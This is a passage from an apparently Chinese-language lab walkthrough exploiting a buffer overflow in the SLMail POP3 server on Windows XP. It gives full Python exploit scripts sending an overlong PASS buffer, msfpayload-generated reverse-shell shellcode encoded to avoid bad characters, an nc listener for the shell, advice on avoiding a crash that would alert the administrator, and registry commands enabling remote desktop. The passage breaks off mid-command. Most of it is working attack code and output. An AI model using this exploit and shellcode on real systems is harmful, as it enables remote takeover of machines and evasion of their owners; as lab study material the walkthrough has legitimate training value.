+<p>在该地址，通过设置断点，判断其下一步操作，验证是否能实现跳转。</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127233011269-843771564.png" /></p>
+<p><strong>• 重发 buffer</strong></p>
+<p><strong>07.py</strong> （ <strong>注意：地址要翻转</strong> ）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2606</span> + <span class="string">&quot;\x8f\x35\x4a\x5f&quot;</span> + <span class="string">&quot;C&quot;</span> *<span class="number">390</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127235050477-1077276435.png" /></p>
+<p><strong>按F7（单步向前执行）</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127235309995-1828893090.png" /></p>
+<h4 id="生成shellcode">7.6 生成shellcode</h4>
+<p><strong>（1）payload:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">**root@kali2017:/usr/share/framework2<span class="comment"># ./msfpayload -** **l**</span></span><br><span class="line">Unknown option: l</span><br><span class="line"></span><br><span class="line">   Usage: ./msfpayload &lt;payload&gt; [var=val] &lt;S|C|P|R|X&gt;</span><br><span class="line"></span><br><span class="line">Payloads: </span><br><span class="line">  bsd_ia32_bind                     BSD IA32 Bind Shell</span><br><span class="line">  bsd_ia32_bind_stg                 BSD IA32 Staged Bind Shell</span><br><span class="line">  bsd_ia32_exec                     BSD IA32 Execute Command</span><br><span class="line">  bsd_ia32_findrecv                 BSD IA32 Recv Tag Findsock Shell</span><br><span class="line">  bsd_ia32_findrecv_stg             BSD IA32 Staged Findsock Shell</span><br><span class="line">  bsd_ia32_findsock                 BSD IA32 SrcPort Findsock Shell</span><br><span class="line">  bsd_ia32_reverse                  BSD IA32 Reverse Shell</span><br><span class="line">  bsd_ia32_reverse_stg              BSD IA32 Staged Reverse Shell</span><br><span class="line">  bsd_sparc_bind                    BSD SPARC Bind Shell</span><br><span class="line">  bsd_sparc_reverse                 BSD SPARC Reverse Shell</span><br><span class="line">  bsdi_ia32_bind                    BSDi IA32 Bind Shell</span><br><span class="line">  bsdi_ia32_bind_stg                BSDi IA32 Staged Bind Shell</span><br><span class="line">  bsdi_ia32_findsock                BSDi IA32 SrcPort Findsock Shell</span><br><span class="line">  bsdi_ia32_reverse                 BSDi IA32 Reverse Shell</span><br><span class="line">  bsdi_ia32_reverse_stg             BSDi IA32 Staged Reverse Shell</span><br><span class="line">  cmd_generic                       Arbitrary Command</span><br><span class="line">  cmd_interact                      Unix Interactive Shell</span><br><span class="line">  cmd_irix_bind                     Irix Inetd Bind Shell</span><br><span class="line">  cmd_localshell                    Interactive Local Shell</span><br><span class="line">  cmd_sol_bind                      Solaris Inetd Bind Shell</span><br><span class="line">  cmd_unix_reverse                  Unix Telnet Piping Reverse Shell</span><br><span class="line">  cmd_unix_reverse_bash             Unix /dev/tcp Piping Reverse Shell</span><br><span class="line">  cmd_unix_reverse_nss              Unix Spaceless Telnet Piping Reverse Shell</span><br><span class="line">  generic_sparc_execve              BSD/Linux/Solaris SPARC Execute Shell</span><br><span class="line">  irix_mips_execve                  Irix MIPS Execute Shell</span><br><span class="line">  linux_ia32_adduser                Linux IA32 Add User</span><br><span class="line">  linux_ia32_bind                   Linux IA32 Bind Shell</span><br><span class="line">  linux_ia32_bind_stg               Linux IA32 Staged Bind Shell</span><br><span class="line">  linux_ia32_exec                   Linux IA32 Execute Command</span><br><span class="line">  linux_ia32_findrecv               Linux IA32 Recv Tag Findsock Shell</span><br><span class="line">  linux_ia32_findrecv_stg           Linux IA32 Staged Findsock Shell</span><br><span class="line">  linux_ia32_findsock               Linux IA32 SrcPort Findsock Shell</span><br><span class="line">  linux_ia32_reverse                Linux IA32 Reverse Shell</span><br><span class="line">  linux_ia32_reverse_impurity       Linux IA32 Reverse Impurity Upload/Execute</span><br><span class="line">  linux_ia32_reverse_stg            Linux IA32 Staged Reverse Shell</span><br><span class="line">  linux_ia32_reverse_udp            Linux IA32 Reverse UDP Shell</span><br><span class="line">  linux_sparc_bind                  Linux SPARC Bind Shell</span><br><span class="line">  linux_sparc_findsock              LINUX SPARC SrcPort Find Shell</span><br><span class="line">  linux_sparc_reverse               Linux SPARC Reverse Shell</span><br><span class="line">  osx_ia32_bind                     Mac OS X Intel Bind Shell</span><br><span class="line">  osx_ppc_bind                      Mac OS X PPC Bind Shell</span><br><span class="line">  osx_ppc_bind_stg                  Mac OS X PPC Staged Bind Shell</span><br><span class="line">  osx_ppc_findrecv_stg              Mac OS X PPC Staged Find Recv Shell</span><br><span class="line">  osx_ppc_reverse                   Mac OS X PPC Reverse Shell</span><br><span class="line">  osx_ppc_reverse_nf_stg            Mac OS X PPC Staged Reverse Null-Free Shell</span><br><span class="line">  osx_ppc_reverse_stg               Mac OS X PPC Staged Reverse Shell</span><br><span class="line">  solaris_ia32_bind                 Solaris IA32 Bind Shell</span><br><span class="line">  solaris_ia32_findsock             Solaris IA32 SrcPort Findsock Shell</span><br><span class="line">  solaris_ia32_reverse              Solaris IA32 Reverse Shell</span><br><span class="line">  solaris_sparc_bind                Solaris SPARC Bind Shell</span><br><span class="line">  solaris_sparc_findsock            Solaris SPARC SrcPort Find Shell</span><br><span class="line">  solaris_sparc_reverse             Solaris SPARC Reverse Shell</span><br><span class="line">  win32_adduser                     Windows Execute net user /ADD</span><br><span class="line">  win32_bind                        Windows Bind Shell</span><br><span class="line">  win32_bind_dllinject              Windows Bind DLL Inject</span><br><span class="line">  win32_bind_meterpreter            Windows Bind Meterpreter DLL Inject</span><br><span class="line">  win32_bind_stg                    Windows Staged Bind Shell</span><br><span class="line">  win32_bind_stg_upexec             Windows Staged Bind Upload/Execute</span><br><span class="line">  win32_bind_vncinject              Windows Bind VNC Server DLL Inject</span><br><span class="line">  win32_downloadexec                Windows Executable Download and Execute</span><br><span class="line">  win32_exec                        Windows Execute Command</span><br><span class="line">  win32_findrecv_ord_meterpreter    Windows Recv Tag Findsock Meterpreter</span><br><span class="line">  win32_findrecv_ord_stg            Windows Recv Tag Findsock Shell</span><br><span class="line">  win32_findrecv_ord_vncinject      Windows Recv Tag Findsock VNC Inject</span><br><span class="line">  win32_passivex                    Windows PassiveX ActiveX Injection Payload</span><br><span class="line">  win32_passivex_meterpreter        Windows PassiveX ActiveX Inject Meterpreter Payload</span><br><span class="line">  win32_passivex_stg                Windows Staged PassiveX Shell</span><br><span class="line">  win32_passivex_vncinject          Windows PassiveX ActiveX Inject VNC Server Payload</span><br><span class="line">  win32_reverse                     Windows Reverse Shell</span><br><span class="line">  win32_reverse_dllinject           Windows Reverse DLL Inject</span><br><span class="line">  win32_reverse_meterpreter         Windows Reverse Meterpreter DLL Inject</span><br><span class="line">  win32_reverse_ord                 Windows Staged Reverse Ordinal Shell</span><br><span class="line">  win32_reverse_ord_vncinject       Windows Reverse Ordinal VNC Server Inject</span><br><span class="line">  win32_reverse_stg                 Windows Staged Reverse Shell</span><br><span class="line">  win32_reverse_stg_upexec          Windows Staged Reverse Upload/Execute</span><br><span class="line">  win32_reverse_vncinject           Windows Reverse VNC Server Inject</span><br></pre></td></tr></table></figure>
+<p><strong>备注：shellcode 的生成是单独用 kali-2017
+生成的，kali-2019中的 msfvenom 使用不熟练生成的 shellcode 总是会超过 500
+字节</strong></p>
+<p><strong>（2）shellcode
+未处理坏字符（LHOST,LPORT均是大写）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali2017:/usr/share/framework2<span class="comment"># ./msfpayload win32_reverse LHOST=10.10.10.171 LPORT=444 C</span></span><br><span class="line"><span class="string">&quot;\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09&quot;</span></span><br><span class="line"><span class="string">&quot;\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x0a\x0a\x0a\xab\x66\x68\x01\xbc\x66\x53\x89\xe1\x95\x68\xec\xf9&quot;</span></span><br><span class="line"><span class="string">&quot;\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3&quot;</span></span><br><span class="line"><span class="string">&quot;\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x77\xfc\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p><strong>（3）shellcode 坏字符处理版</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali2017:/usr/share/framework2<span class="comment"># ./msfpayload win32_reverse LHOST=10.10.10.171 LPORT=444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;    </span></span><br><span class="line">[*] Using Msf::Encoder::PexFnstenvMov with final size of 310 bytes</span><br><span class="line"><span class="string">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xab\x87\xc8&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x31\x83\xeb\xfc\xe2\xf4\x57\xed\x23\x7c\x43\x7e\x37\xce\x54\xe7&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x43\x5d\x8f\xa3\x43\x74\x97\x0c\xb4\x34\xd3\x86\x27\xba\xe4\x9f&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x43\x6e\x8b\x86\x23\x78\x20\xb3\x43\x30\x45\xb6\x08\xa8\x07\x03&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x08\x45\xac\x46\x02\x3c\xaa\x45\x23\xc5\x90\xd3\xec\x19\xde\x62&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x43\x6e\x8f\x86\x23\x57\x20\x8b\x83\xba\xf4\x9b\xc9\xda\xa8\xab&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x43\xb8\xc7\xa3\xd4\x50\x68\xb6\x13\x55\x20\xc4\xf8\xba\xeb\x8b&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x43\x41\xb7\x2a\x43\x71\xa3\xd9\xa0\xbf\xe5\x89\x24\x61\x54\x51&quot;</span>.</span><br><span class="line"><span class="string">&quot;\xae\x62\xcd\xef\xfb\x03\xc3\xf0\xbb\x03\xf4\xd3\x37\xe1\xc3\x4c&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x25\xcd\x90\xd7\x37\xe7\xf4\x0e\x2d\x57\x2a\x6a\xc0\x33\xfe\xed&quot;</span>.</span><br><span class="line"><span class="string">&quot;\xca\xce\x7b\xef\x11\x38\x5e\x2a\x9f\xce\x7d\xd4\x9b\x62\xf8\xc4&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x9b\x72\xf8\x78\x18\x59\xa1\x8d\xc2\x9a\xcd\xef\xc9\x8d\xcd\xd4&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x41\xd0\x3e\xef\x24\xc8\x01\xe7\x9f\xce\x7d\xed\xd8\x60\xfe\x78&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x18\x57\xc1\xe3\xae\x59\xc8\xea\xa2\x61\xf2\xae\x04\xb8\x4c\xed&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x8c\xb8\x49\xb6\x08\xc2\x01\x12\x41\xcc\x55\xc5\xe5\xcf\xe9\xab&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x45\x4b\x93\x2c\x63\x9a\xc3\xf5\x36\x82\xbd\x78\xbd\x19\x54\x51&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x93\x66\xf9\xd6\x99\x60\xc1\x86\x99\x60\xfe\xd6\x37\xe1\xc3\x2a&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x11\x34\x65\xd4\x37\xe7\xc1\x78\x37\x06\x54\x57\xa0\xd6\xd2\x41&quot;</span>.</span><br><span class="line"><span class="string">&quot;\xb1\xce\xde\x83\x37\xe7\x54\xf0\x34\xce\x7b\xef\x38\xbb\xaf\xd8&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x9b\xce\x7d\x78\x18\x31&quot;</span>;</span><br></pre></td></tr></table></figure>
+<h4 id="getshell"><strong>7.7 getshell</strong></h4>
+<p><strong>（1）08.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">shellcode =( </span><br><span class="line"><span class="string">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xab\x87\xc8&quot;</span>+　　　　　　<span class="comment">#&quot;.&quot;改&quot;+&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\x83\xeb\xfc\xe2\xf4\x57\xed\x23\x7c\x43\x7e\x37\xce\x54\xe7&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x43\x5d\x8f\xa3\x43\x74\x97\x0c\xb4\x34\xd3\x86\x27\xba\xe4\x9f&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x43\x6e\x8b\x86\x23\x78\x20\xb3\x43\x30\x45\xb6\x08\xa8\x07\x03&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x08\x45\xac\x46\x02\x3c\xaa\x45\x23\xc5\x90\xd3\xec\x19\xde\x62&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x43\x6e\x8f\x86\x23\x57\x20\x8b\x83\xba\xf4\x9b\xc9\xda\xa8\xab&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x43\xb8\xc7\xa3\xd4\x50\x68\xb6\x13\x55\x20\xc4\xf8\xba\xeb\x8b&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x43\x41\xb7\x2a\x43\x71\xa3\xd9\xa0\xbf\xe5\x89\x24\x61\x54\x51&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xae\x62\xcd\xef\xfb\x03\xc3\xf0\xbb\x03\xf4\xd3\x37\xe1\xc3\x4c&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x25\xcd\x90\xd7\x37\xe7\xf4\x0e\x2d\x57\x2a\x6a\xc0\x33\xfe\xed&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xca\xce\x7b\xef\x11\x38\x5e\x2a\x9f\xce\x7d\xd4\x9b\x62\xf8\xc4&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x9b\x72\xf8\x78\x18\x59\xa1\x8d\xc2\x9a\xcd\xef\xc9\x8d\xcd\xd4&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x41\xd0\x3e\xef\x24\xc8\x01\xe7\x9f\xce\x7d\xed\xd8\x60\xfe\x78&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x18\x57\xc1\xe3\xae\x59\xc8\xea\xa2\x61\xf2\xae\x04\xb8\x4c\xed&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x8c\xb8\x49\xb6\x08\xc2\x01\x12\x41\xcc\x55\xc5\xe5\xcf\xe9\xab&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x45\x4b\x93\x2c\x63\x9a\xc3\xf5\x36\x82\xbd\x78\xbd\x19\x54\x51&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x93\x66\xf9\xd6\x99\x60\xc1\x86\x99\x60\xfe\xd6\x37\xe1\xc3\x2a&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x11\x34\x65\xd4\x37\xe7\xc1\x78\x37\x06\x54\x57\xa0\xd6\xd2\x41&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xb1\xce\xde\x83\x37\xe7\x54\xf0\x34\xce\x7b\xef\x38\xbb\xaf\xd8&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x9b\xce\x7d\x78\x18\x31&quot;</span>)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2606</span> + <span class="string">&quot;\x03\x97\x4b\x5f&quot;</span> + <span class="string">&quot;\x90&quot;</span> * <span class="number">8</span> + shellcode</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   s.close()</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>备注：</strong>
+"0x90"表示无操作，防止shellcode前部分代码被擦除</p>
+<p><strong>（2）重发</strong> <strong>buffer</strong></p>
+<p><strong>注意：nc -vlp 444
+(kali先开启侦听端口等待反弹shell的连接)</strong></p>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128111513646-919605536.png" /></strong></p>
+<p><strong>连接成功！</strong></p>
+<p><strong>经测试退出后亦可重复连接。</strong>
+有些shellcode执行结束会以exitprocess方式退出整个进程，将导致邮件服务奔溃，会引起管理员注意，不过新版本的metasploit已经进行优化。</p>
+<p>•
+Slmail是一个基于线程的应用，可用ExitThread方式可以避免整个服务崩溃，可实现重复溢出；</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfpayload win32_reverse LHOST=10.10.10.171 EXITFUNC=thread LPORT=444 R | ./msfencode -b <span class="string">&quot;\x00\x0a\x0d&quot;</span></span><br></pre></td></tr></table></figure>
+<h4 id="图形界面控制">7.8 图形界面控制</h4>
+<p><strong>在此基础上ftp下载一个图形化木马管理程序</strong></p>
+<p><strong>通过注册表可开启windows_xp_sp3的远程桌面服务</strong></p>
+<p><strong>3389.reg：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00  </span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]  </span><br><span class="line"><span class="string">&quot;fDenyTSConnections&quot;</span>=dword:00000000  </span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]  </span><br><span class="line"><span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d  </span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]  </span><br><span class="line"><span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d</span><br></pre></td></tr></table></figure>
+<p><strong>执行前：</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128114644165-1808985077.png" /></p>
+<p><strong>执行：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;<span class="built_in">echo</span> Windows Registry Editor Version 5.00&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> Windows Registry Editor Version 5.00&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> <span class="string">&quot;fDenyTSConnections&quot;</span>=dword:00000000&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;fDenyTSConnections&quot;</span>=dword:00000000&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> <span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span 